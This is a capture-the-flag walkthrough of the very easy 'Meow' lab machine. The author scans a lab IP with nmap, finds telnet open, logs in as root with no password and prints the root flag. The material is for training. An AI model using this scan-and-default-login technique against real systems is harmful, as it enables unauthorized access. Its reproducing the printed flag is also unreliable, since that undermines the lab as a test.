---
Title: Meow Walktrough\
Author: sl0th0x87
Date: 2022/01/10
Tags: Linux, Network, Account Missconfiguration
Tools: nmap
Difficulty: very easy
---
# Meow

## General informations
* IP Attack Machine: 10.10.14.39
* IP Target Machine: 10.129.1.17
* Operating System: Linux

## NMAP scan

Make a portscan over all ports with service detecion\
Enable NMAP scripts and disable ping scan
```bash
sudo nmap -sV -sC -Pn -p- 10.129.1.17
```

Output:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 15:51 CET
Nmap scan report for 10.129.1.17
Host is up (0.042s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.70 seconds
```

### Open ports
* 23/tcp open  telnet  Linux telnetd

## Telnet
```bash
telnet 10.129.1.17
```

Output:
```bash
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

 █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
```
Try to login with user 'root'\
Wow, we are in. Telnet with root access and no password
```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 10 Jan 2022 03:07:27 PM UTC

  System load:  0.45              Processes:             138
  Usage of /:   41.7% of 7.75GB   Users logged in:       0
  Memory usage: 4%                IPv4 address for eth0: 10.129.1.17
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 10 15:06:57 UTC 2022 on pts/0
root@Meow:~# 
```

Show files in root home directory
```bash
root@Meow:~# ls -l
total 8
-rw-r--r-- 1 root root   33 Jun 17  2021 flag.txt
drwxr-xr-x 3 root root 4096 Apr 21  2021 snap
```
Get root flag
```bash
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

Congratulations! You got the machine!